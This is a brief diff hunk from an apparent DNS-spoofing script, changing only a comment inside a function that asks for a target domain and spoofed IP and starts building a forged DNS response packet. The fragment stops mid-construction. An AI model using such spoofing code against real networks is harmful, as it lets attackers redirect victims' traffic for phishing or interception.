@@ -58,7 +58,7 @@ def perform_dns_spoofing():
     target_domain = input("Enter the target domain to spoof: ")
     spoofed_ip = input("Enter the IP address to spoof: ")
 
-    # Create a DNS response packet with spoofed IP
+    # Craft DNS response packet with spoofed IP
     spoofed_pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(
         qr=1,
         id=42,
